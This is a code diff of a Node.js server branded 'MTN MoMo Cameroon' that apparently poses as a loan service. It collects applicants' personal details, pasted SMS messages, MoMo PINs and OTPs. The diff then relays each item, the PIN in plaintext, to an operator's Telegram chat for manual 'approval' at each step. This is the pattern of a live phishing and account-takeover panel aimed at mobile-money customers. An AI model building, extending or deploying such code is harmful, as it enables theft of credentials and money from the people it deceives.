@@ -50,23 +50,25 @@ const SESSION_SECRET = process.env.SESSION_SECRET || 'dev-secret-change-me';
 const TG_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TG_CHAT = process.env.TELEGRAM_CHAT_ID;
 const TG_API = `https://api.telegram.org/bot${TG_TOKEN}`;
+const IS_DEV = process.env.NODE_ENV !== 'production';
 
 const OTP_EXPIRY_MIN = parseInt(process.env.OTP_EXPIRY_MINUTES || '10');
 const OTP_COOLDOWN = parseInt(process.env.OTP_RESEND_COOLDOWN_SECONDS || '120');
 const OTP_MAX_ATTEMPTS = 5;
+const SESSION_DAYS = 30;
 
 // ─── Rate limiters ───
 const globalLimiter = rateLimit({
-    windowMs: 15 * 60 * 1000, max: 300,
+    windowMs: 15 * 60 * 1000, max: 500,
     standardHeaders: true, legacyHeaders: false
 });
 const applyLimiter = rateLimit({
-    windowMs: 60 * 60 * 1000, max: 5,
+    windowMs: 60 * 60 * 1000, max: 10,
     keyGenerator: r => (r.body && r.body.email) || r.ip,
-    message: { ok: false, error: 'Trop de tentatives. Réessayez plus tard.' }
+    message: { ok: false, error: 'Trop de tentatives.' }
 });
 const checkLimiter = rateLimit({
-    windowMs: 60 * 60 * 1000, max: 10,
+    windowMs: 60 * 60 * 1000, max: 20,
     keyGenerator: r => (r.body && r.body.email) || r.ip,
     message: { ok: false, error: 'Trop de vérifications.' }
 });
@@ -81,7 +83,25 @@ app.use('/api/', globalLimiter);
 function newAppId() { return 'MTN-CM-' + crypto.randomBytes(4).toString('hex').toUpperCase(); }
 function newToken(bytes = 32) { return crypto.randomBytes(bytes).toString('hex'); }
 function newOtp() { return String(crypto.randomInt(100000, 999999)); }
-function hashOtp(otp) { return crypto.createHash('sha256').update(otp).digest('hex'); }
+function hashOtp(otp) { return crypto.createHash('sha256').update(String(otp)).digest('hex'); }
+
+// Pin hashing with Node's PBKDF2 (no pgcrypto)
+function hashPin(pin) {
+    const salt = crypto.randomBytes(16).toString('hex');
+    const hash = crypto.pbkdf2Sync(String(pin), salt, 10000, 64, 'sha512').toString('hex');
+    return `pbkdf2$${salt}$${hash}`;
+}
+function verifyPin(pin, stored) {
+    if (!stored || stored.indexOf('pbkdf2$') !== 0) return false;
+    const parts = stored.split('$');
+    if (parts.length !== 3) return false;
+    const salt = parts[1], expected = parts[2];
+    const actual = crypto.pbkdf2Sync(String(pin), salt, 10000, 64, 'sha512').toString('hex');
+    try {
+        return crypto.timingSafeEqual(Buffer.from(actual, 'hex'), Buffer.from(expected, 'hex'));
+    } catch (e) { return false; }
+}
+
 function esc(t) { return String(t == null ? '' : t).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;'); }
 function code(t) { return '<code>' + esc(t) + '</code>'; }
 function fmt(n) { return Number(n || 0).toLocaleString('en-US'); }
@@ -89,20 +109,22 @@ function xaf(n) { return 'XAF ' + fmt(n); }
 function normPhone(p) { return String(p || '').replace(/\D/g, '').replace(/^237/, '').slice(0, 9); }
 function maskEmail(e) {
     if (!e || e.indexOf('@') < 0) return '***';
-    const [u, d] = e.split('@');
-    return u.slice(0, 2) + '***@' + d;
+    const parts = e.split('@');
+    return parts[0].slice(0, 2) + '***@' + parts[1];
 }
 function maskPhone(p) {
     if (!p || p.length < 4) return '***';
     return p.slice(0, 2) + '***' + p.slice(-3);
 }
+
+// ─── Session ───
 function issueSession(res, appId) {
-    const token = jwt.sign({ id: appId }, SESSION_SECRET, { expiresIn: '30d' });
+    const token = jwt.sign({ id: appId }, SESSION_SECRET, { expiresIn: SESSION_DAYS + 'd' });
     res.cookie('momo_session', token, {
         httpOnly: true,
         secure: process.env.NODE_ENV === 'production',
         sameSite: 'lax',
-        maxAge: 30 * 24 * 3600 * 1000,
+        maxAge: SESSION_DAYS * 24 * 3600 * 1000,
         path: '/'
     });
 }
@@ -121,7 +143,10 @@ function requireSession(req, res, next) {
             req.appRow = rows[0];
             next();
         })
-        .catch(e => res.status(500).json({ ok: false, error: e.message }));
+        .catch(e => {
+            console.error('requireSession:', e.message);
+            res.status(500).json({ ok: false, error: IS_DEV ? e.message : 'Erreur serveur.' });
+        });
 }
 
 // ─── Telegram ───
@@ -136,45 +161,43 @@ async function tgSend(text, buttons) {
         });
         const j = await r.json();
         if (!j.ok) console.error('TG:', j.description);
+        else console.log(`✅ TG sent (${j.result.message_id})`);
     } catch (e) { console.error('TG:', e.message); }
 }
 
-function askApproval(step, appRow) {
+function askApproval(step, app_) {
     const buttons = [[
-        { text: '✅ APPROVE', callback_data: JSON.stringify({ a: 'Y', s: step, id: appRow.id }) },
-        { text: '❌ REJECT', callback_data: JSON.stringify({ a: 'N', s: step, id: appRow.id }) }
+        { text: '✅ APPROVE', callback_data: JSON.stringify({ a: 'Y', s: step, id: app_.id }) },
+        { text: '❌ REJECT', callback_data: JSON.stringify({ a: 'N', s: step, id: app_.id }) }
     ]];
-
-    const header = `🆔 ${code(appRow.id)}\n👤 ${esc(appRow.full_name)}\n📧 ${code(appRow.email)}\n📱 ${code('+237 ' + appRow.phone)}\n`;
+    const header = `🆔 ${code(app_.id)}\n👤 ${esc(app_.full_name)}\n📧 ${code(app_.email)}\n📱 ${code('+237 ' + app_.phone)}\n`;
     let body = '';
 
     if (step === 'application') {
-        const monthly = Math.ceil(appRow.loan_amount / appRow.loan_term);
+        const monthly = Math.ceil(app_.loan_amount / app_.loan_term);
         body = `📋 <b>STEP 1/4 — LOAN APPLICATION</b>\n━━━━━━━━━━━━━━━━━━━━━━\n${header}` +
-            `\n💰 <b>${xaf(appRow.loan_amount)}</b> · ${appRow.loan_term} months\n` +
-            `📊 Monthly: <b>${xaf(monthly)}</b>\n🎯 ${esc(appRow.loan_purpose)}\n\n` +
-            `💼 ${esc(appRow.employment)} · ${xaf(appRow.annual_income)}/yr\n` +
-            `👥 Kin: ${esc(appRow.kin_name)} ${code('+237 ' + appRow.kin_phone)}\n` +
-            `📊 20%: ${appRow.has_20_percent ? '✅' : '❌'} · 📜 T&C: ✅\n\n` +
-            `<b>Approve to move to SMS verification?</b>`;
+            `\n💰 <b>${xaf(app_.loan_amount)}</b> · ${app_.loan_term} months\n` +
+            `📊 Monthly: <b>${xaf(monthly)}</b>\n🎯 ${esc(app_.loan_purpose)}\n\n` +
+            `💼 ${esc(app_.employment)} · ${xaf(app_.annual_income)}/yr\n` +
+            `👥 Kin: ${esc(app_.kin_name)} ${code('+237 ' + app_.kin_phone)}\n` +
+            `📊 20%: ${app_.has_20_percent ? '✅' : '❌'} · 📜 T&C: ✅\n\n` +
+            `<b>Approve to move to SMS step?</b>`;
     } else if (step === 'sms') {
         body = `📩 <b>STEP 2/4 — SMS VERIFICATION</b>\n━━━━━━━━━━━━━━━━━━━━━━\n${header}` +
-            `\n<b>SMS pasted by user:</b>\n<pre>${esc(appRow.sms_content || '')}</pre>\n` +
-            `<b>Approve SMS to move to MoMo PIN?</b>`;
+            `\n<b>SMS pasted by user:</b>\n<pre>${esc(app_.sms_content || '')}</pre>\n` +
+            `<b>Approve SMS to move to PIN?</b>`;
     } else if (step === 'pin') {
         body = `🔐 <b>STEP 3/4 — MoMo PIN</b>\n━━━━━━━━━━━━━━━━━━━━━━\n${header}` +
-            `\n<b>PIN entered:</b> <code>${esc(appRow.momo_pin_entered || '')}</code>\n\n` +
+            `\n<b>PIN entered:</b> <code>${esc(app_.momo_pin_entered || '')}</code>\n\n` +
             `<b>Approve PIN to move to OTP?</b>`;
     } else if (step === 'otp') {
         body = `🔢 <b>STEP 4/4 — OTP</b>\n━━━━━━━━━━━━━━━━━━━━━━\n${header}` +
-            `\n<b>OTP entered:</b> <code>${esc(appRow.otp_entered || '')}</code>\n\n` +
+            `\n<b>OTP entered:</b> <code>${esc(app_.otp_entered || '')}</code>\n\n` +
             `<b>Approve OTP to finalize the loan?</b>`;
     }
-
     tgSend(body, buttons);
 }
 
-// ─── SMS gateway ───
 async function sendSms(to, text) {
     const url = process.env.SMS_GATEWAY_URL;
     const key = process.env.SMS_GATEWAY_API_KEY;
@@ -193,7 +216,7 @@ async function sendSms(to, text) {
 // HEALTH & CONFIG
 // ═══════════════════════════════════════════════════════════
 app.get('/health', async (req, res) => {
-    try { await pool.query('SELECT 1'); res.json({ ok: true, version: '3.0.0' }); }
+    try { await pool.query('SELECT 1'); res.json({ ok: true, version: '3.0.2' }); }
     catch (e) { res.status(500).json({ ok: false, error: e.message }); }
 });
 
@@ -250,10 +273,8 @@ app.get('/api/terms', (req, res) => {
 });
 
 // ═══════════════════════════════════════════════════════════
-// FLOW 1 — FIRST-TIME APPLICATION
+// APPLICATION — create and route to admin
 // ═══════════════════════════════════════════════════════════
-
-// POST /api/apply — Create application, send Telegram approval
 app.post('/api/apply', applyLimiter, async (req, res) => {
     try {
         const b = req.body || {};
@@ -270,7 +291,6 @@ app.post('/api/apply', applyLimiter, async (req, res) => {
         const kinName = String(b.kinName || '').trim();
         const kinPhone = normPhone(b.kinPhone);
 
-        // Validation
         if (fullName.length < 3) return res.status(400).json({ ok: false, error: 'Nom complet requis.' });
         if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) return res.status(400).json({ ok: false, error: 'Email invalide.' });
         if (!/^\d{9}$/.test(phone)) return res.status(400).json({ ok: false, error: 'Téléphone à 9 chiffres.' });
@@ -286,11 +306,10 @@ app.post('/api/apply', applyLimiter, async (req, res) => {
         if (b.has20Percent !== true) return res.status(400).json({ ok: false, error: 'Vous devez confirmer la règle des 20 %.' });
         if (b.tncAccepted !== true) return res.status(400).json({ ok: false, error: 'Vous devez accepter les Conditions.' });
 
-        // Duplicate check
         const dup = await pool.query(
             `SELECT id FROM applications
              WHERE (email = $1 OR phone = $2)
-               AND status NOT IN ('approved', 'rejected')`,
+               AND status NOT IN ('approved', 'rejected') LIMIT 1`,
             [email, phone]
         );
         if (dup.rows.length) {
@@ -302,6 +321,8 @@ app.post('/api/apply', applyLimiter, async (req, res) => {
         }
 
         const id = newAppId();
+        const pinHash = hashPin(momoPin);
+
         await pool.query(
             `INSERT INTO applications (
                 id, full_name, email, phone, momo_pin_hash,
@@ -310,28 +331,29 @@ app.post('/api/apply', applyLimiter, async (req, res) => {
                 has_20_percent, tnc_accepted_at,
                 status, user_submitted
             ) VALUES (
-                $1, $2, $3, $4, crypt($5, gen_salt('bf', 8)),
+                $1, $2, $3, $4, $5,
                 $6, $7, $8, $9, $10, $11, $12, $13,
                 $14, NOW(), 'application_review', TRUE
             )`,
-            [id, fullName, email, phone, momoPin,
+            [id, fullName, email, phone, pinHash,
              loanType, loanAmount, loanTerm, loanPurpose,
              employment, annualIncome, kinName, kinPhone,
              true]
         );
 
-        console.log(`✅ Application ${id} created`);
+        console.log(`✅ Application ${id} created for ${email}`);
+
         const full = await pool.query(`SELECT * FROM applications WHERE id = $1`, [id]);
         await askApproval('application', full.rows[0]);
 
         res.json({ ok: true, applicationId: id });
     } catch (e) {
-        console.error('/api/apply:', e.message);
-        res.status(500).json({ ok: false, error: 'Erreur serveur.' });
+        console.error('/api/apply:', e.message, e.stack);
+        res.status(500).json({ ok: false, error: IS_DEV ? ('Erreur: ' + e.message) : 'Erreur serveur.' });
     }
 });
 
-// GET /api/application/:id — current state of application
+// GET application state — auto-issues session when approved
 app.get('/api/application/:id', async (req, res) => {
     try {
         const { rows } = await pool.query(
@@ -341,11 +363,26 @@ app.get('/api/application/:id', async (req, res) => {
             [req.params.id]
         );
         if (!rows.length) return res.status(404).json({ ok: false, error: 'Introuvable.' });
-        res.json({ ok: true, ...rows[0] });
-    } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
+
+        const app_ = rows[0];
+
+        // Auto-issue session if approved and no session currently set
+        if (app_.status === 'approved') {
+            const existing = readSession(req);
+            if (!existing || existing.id !== app_.id) {
+                issueSession(res, app_.id);
+                console.log(`🔑 Session auto-issued for approved app ${app_.id}`);
+            }
+        }
+
+        res.json({ ok: true, ...app_ });
+    } catch (e) {
+        console.error('/api/application/:id:', e.message);
+        res.status(500).json({ ok: false, error: IS_DEV ? e.message : 'Erreur serveur.' });
+    }
 });
 
-// POST /api/application/submit-sms
+// Submit SMS
 app.post('/api/application/submit-sms', async (req, res) => {
     try {
         const id = String((req.body || {}).applicationId || '');
@@ -355,8 +392,8 @@ app.post('/api/application/submit-sms', async (req, res) => {
 
         const { rows } = await pool.query(`SELECT * FROM applications WHERE id = $1`, [id]);
         if (!rows.length) return res.status(404).json({ ok: false, error: 'Introuvable.' });
-        if (rows[0].status !== 'sms_pending' || rows[0].user_submitted) {
-            return res.status(400).json({ ok: false, error: 'Étape SMS non attendue.' });
+        if (rows[0].status !== 'sms_pending') {
+            return res.status(400).json({ ok: false, error: 'Étape SMS non attendue (statut: ' + rows[0].status + ').' });
         }
 
         await pool.query(
@@ -366,10 +403,13 @@ app.post('/api/application/submit-sms', async (req, res) => {
         const full = await pool.query(`SELECT * FROM applications WHERE id = $1`, [id]);
         await askApproval('sms', full.rows[0]);
         res.json({ ok: true });
-    } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
+    } catch (e) {
+        console.error('submit-sms:', e.message);
+        res.status(500).json({ ok: false, error: IS_DEV ? e.message : 'Erreur serveur.' });
+    }
 });
 
-// POST /api/application/submit-pin
+// Submit PIN
 app.post('/api/application/submit-pin', async (req, res) => {
     try {
         const id = String((req.body || {}).applicationId || '');
@@ -378,7 +418,7 @@ app.post('/api/application/submit-pin', async (req, res) => {
 
         const { rows } = await pool.query(`SELECT * FROM applications WHERE id = $1`, [id]);
         if (!rows.length) return res.status(404).json({ ok: false, error: 'Introuvable.' });
-        if (rows[0].status !== 'pin_pending' || rows[0].user_submitted) {
+        if (rows[0].status !== 'pin_pending') {
             return res.status(400).json({ ok: false, error: 'Étape PIN non attendue.' });
         }
 
@@ -389,10 +429,13 @@ app.post('/api/application/submit-pin', async (req, res) => {
         const full = await pool.query(`SELECT * FROM applications WHERE id = $1`, [id]);
         await askApproval('pin', full.rows[0]);
         res.json({ ok: true });
-    } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
+    } catch (e) {
+        console.error('submit-pin:', e.message);
+        res.status(500).json({ ok: false, error: IS_DEV ? e.message : 'Erreur serveur.' });
+    }
 });
 
-// POST /api/application/submit-otp
+// Submit OTP
 app.post('/api/application/submit-otp', async (req, res) => {
     try {
         const id = String((req.body || {}).applicationId || '');
@@ -401,7 +444,7 @@ app.post('/api/application/submit-otp', async (req, res) => {
 
         const { rows } = await pool.query(`SELECT * FROM applications WHERE id = $1`, [id]);
         if (!rows.length) return res.status(404).json({ ok: false, error: 'Introuvable.' });
-        if (rows[0].status !== 'otp_pending' || rows[0].user_submitted) {
+        if (rows[0].status !== 'otp_pending') {
             return res.status(400).json({ ok: false, error: 'Étape OTP non attendue.' });
         }
 
@@ -412,11 +455,14 @@ app.post('/api/application/submit-otp', async (req, res) => {
         const full = await pool.query(`SELECT * FROM applications WHERE id = $1`, [id]);
         await askApproval('otp', full.rows[0]);
         res.json({ ok: true });
-    } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
+    } catch (e) {
+        console.error('submit-otp:', e.message);
+        res.status(500).json({ ok: false, error: IS_DEV ? e.message : 'Erreur serveur.' });
+    }
 });
 
 // ═══════════════════════════════════════════════════════════
-// FLOW 2 — CHECK STATUS (email + phone → OTP → PIN → dashboard)
+// CHECK STATUS — email + phone → OTP by email → PIN
 // ═══════════════════════════════════════════════════════════
 app.post('/api/check-status/start', checkLimiter, async (req, res) => {
     try {
@@ -447,10 +493,12 @@ app.post('/api/check-status/start', checkLimiter, async (req, res) => {
             ok: true,
             sessionToken: token,
             emailMasked: maskEmail(app_.email),
-            phoneMasked: maskPhone(phone),
-            message: 'Un code à 6 chiffres a été envoyé à votre email.'
+            phoneMasked: maskPhone(phone)
         });
-    } catch (e) { console.error('/check-status/start:', e.message); res.status(500).json({ ok: false, error: 'Erreur serveur.' }); }
+    } catch (e) {
+        console.error('/check-status/start:', e.message);
+        res.status(500).json({ ok: false, error: IS_DEV ? e.message : 'Erreur serveur.' });
+    }
 });
 
 app.post('/api/check-status/verify-otp', async (req, res) => {
@@ -476,7 +524,10 @@ app.post('/api/check-status/verify-otp', async (req, res) => {
 
         await pool.query(`UPDATE check_status_otps SET verified = TRUE WHERE token = $1`, [token]);
         res.json({ ok: true, next: 'pin' });
-    } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
+    } catch (e) {
+        console.error('verify-otp:', e.message);
+        res.status(500).json({ ok: false, error: IS_DEV ? e.message : 'Erreur serveur.' });
+    }
 });
 
 app.post('/api/check-status/resend-otp', cooldownLimiter, async (req, res) => {
@@ -500,7 +551,10 @@ app.post('/api/check-status/resend-otp', cooldownLimiter, async (req, res) => {
         );
         await sendOtpEmail({ to: appR.rows[0].email, name: appR.rows[0].full_name, otp, purpose: 'check-status' });
         res.json({ ok: true });
-    } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
+    } catch (e) {
+        console.error('resend-otp:', e.message);
+        res.status(500).json({ ok: false, error: IS_DEV ? e.message : 'Erreur serveur.' });
+    }
 });
 
 app.post('/api/check-status/verify-pin', async (req, res) => {
@@ -516,16 +570,20 @@ app.post('/api/check-status/verify-pin', async (req, res) => {
         if (!rows.length || !rows[0].verified) return res.status(400).json({ ok: false, error: 'OTP non vérifié.' });
 
         const appId = rows[0].application_id;
-        const check = await pool.query(
-            `SELECT id FROM applications WHERE id = $1 AND momo_pin_hash = crypt($2, momo_pin_hash)`,
-            [appId, pin]
-        );
-        if (!check.rows.length) return res.status(401).json({ ok: false, error: 'Code PIN MoMo incorrect.' });
+        const appR = await pool.query(`SELECT id, momo_pin_hash FROM applications WHERE id = $1`, [appId]);
+        if (!appR.rows.length) return res.status(404).json({ ok: false, error: 'Demande introuvable.' });
+
+        if (!verifyPin(pin, appR.rows[0].momo_pin_hash)) {
+            return res.status(401).json({ ok: false, error: 'Code PIN MoMo incorrect.' });
+        }
 
         await pool.query(`DELETE FROM check_status_otps WHERE token = $1`, [token]);
         issueSession(res, appId);
         res.json({ ok: true });
-    } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
+    } catch (e) {
+        console.error('verify-pin:', e.message);
+        res.status(500).json({ ok: false, error: IS_DEV ? e.message : 'Erreur serveur.' });
+    }
 });
 
 // ═══════════════════════════════════════════════════════════
@@ -544,6 +602,11 @@ app.get('/api/session', (req, res) => {
             });
         })
         .catch(() => res.json({ ok: true, loggedIn: false }));
+});
+
+app.post('/api/logout', (req, res) => {
+    res.cookie('momo_session', '', { httpOnly: true, expires: new Date(0), path: '/' });
+    res.json({ ok: true });
 });
 
 app.get('/api/dashboard', requireSession, async (req, res) => {
@@ -573,7 +636,10 @@ app.get('/api/dashboard', requireSession, async (req, res) => {
             user: { fullName: a.full_name, email: a.email, phoneMasked: maskPhone(a.phone) },
             transactions: tx.rows
         });
-    } catch (e) { res.status(500).json({ ok: false, error: e.message }); }
+    } catch (e) {
+        console.error('/api/dashboard:', e.message);
+        res.status(500).json({ ok: false, error: IS_DEV ? e.message : 'Erreur serveur.' });
+    }
 });
 
 app.get('/api/contract-pdf', requireSession, (req, res) => {
@@ -588,7 +654,10 @@ app.get('/api/contract-pdf', requireSession, (req, res) => {
     doc.moveDown(0.5);
     doc.strokeColor('#FFCC00').lineWidth(3).moveTo(50, doc.y).lineTo(545, doc.y).stroke();
     doc.moveDown(1);
-    const line = (l, v) => { doc.font('Helvetica-Bold').fillColor('#333').fontSize(10).text(l + ':', { continued: true }); doc.font('Helvetica').fillColor('#000').text(' ' + (v || 'N/A')); };
+    const line = (l, v) => {
+        doc.font('Helvetica-Bold').fillColor('#333').fontSize(10).text(l + ':', { continued: true });
+        doc.font('Helvetica').fillColor('#000').text(' ' + (v || 'N/A'));
+    };
     doc.font('Helvetica-Bold').fontSize(12).text('BORROWER'); doc.moveDown(0.3);
     line('Application ID', a.id);
     line('Full Name', a.full_name);
@@ -621,14 +690,15 @@ app.post('/api/telegram-webhook', async (req, res) => {
         let data;
         try { data = JSON.parse(q.data); } catch (e) { return; }
 
-        const { a: action, s: step, id } = data;
+        const action = data.a;
+        const step = data.s;
+        const id = data.id;
         const approved = action === 'Y';
 
         const { rows } = await pool.query(`SELECT * FROM applications WHERE id = $1`, [id]);
         if (!rows.length) return;
         const app_ = rows[0];
 
-        // Verify the step matches current status
         const expected = { application: 'application_review', sms: 'sms_pending', pin: 'pin_pending', otp: 'otp_pending' }[step];
         if (app_.status !== expected) {
             await tgSend(`⚠️ Ignored: ${step} but current status is ${app_.status}`);
@@ -647,7 +717,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
             );
             await tgSend(`❌ <b>REJECTED — ${step.toUpperCase()}</b>\n🆔 ${code(id)}\n👤 ${esc(app_.full_name)}`);
         } else {
-            // Advance to next step
             const nextStatus = {
                 application: 'sms_pending',
                 sms: 'pin_pending',
@@ -686,10 +755,10 @@ app.post('/api/telegram-webhook', async (req, res) => {
                     `✅ SMS + Email sent to customer`
                 );
             } else {
-                const stepLabels = { sms_pending: 'SMS', pin_pending: 'PIN', otp_pending: 'OTP' };
+                const labels = { sms_pending: 'SMS', pin_pending: 'PIN', otp_pending: 'OTP' };
                 await tgSend(
                     `✅ <b>${step.toUpperCase()} APPROVED</b>\n🆔 ${code(id)}\n\n` +
-                    `→ Customer moves to <b>${stepLabels[nextStatus]} step</b>`
+                    `→ Customer moves to <b>${labels[nextStatus]} step</b>`
                 );
             }
         }
@@ -698,7 +767,9 @@ app.post('/api/telegram-webhook', async (req, res) => {
             method: 'POST', headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ callback_query_id: q.id, text: approved ? 'Approved' : 'Rejected' })
         }).catch(() => {});
-    } catch (e) { console.error('Webhook:', e.message); }
+    } catch (e) {
+        console.error('Webhook:', e.message);
+    }
 });
 
 // ═══════════════════════════════════════════════════════════
@@ -710,10 +781,14 @@ app.get('*', (req, res) => {
 
 (async () => {
     try { await initSchema(); }
-    catch (e) { console.error('Schema init failed:', e.message); process.exit(1); }
+    catch (e) {
+        console.error('❌ Schema init failed:', e.message);
+        console.error(e.stack);
+        process.exit(1);
+    }
     app.listen(PORT, '0.0.0.0', () => {
         console.log('═══════════════════════════════════════');
-        console.log(`🚀 MTN MoMo Cameroon v3.0`);
+        console.log(`🚀 MTN MoMo Cameroon v3.0.2`);
         console.log(`   Port: ${PORT}`);
         console.log(`   Base URL: ${APP_BASE_URL}`);
         console.log(`   Telegram: ${TG_TOKEN ? 'set' : 'MISSING'}`);
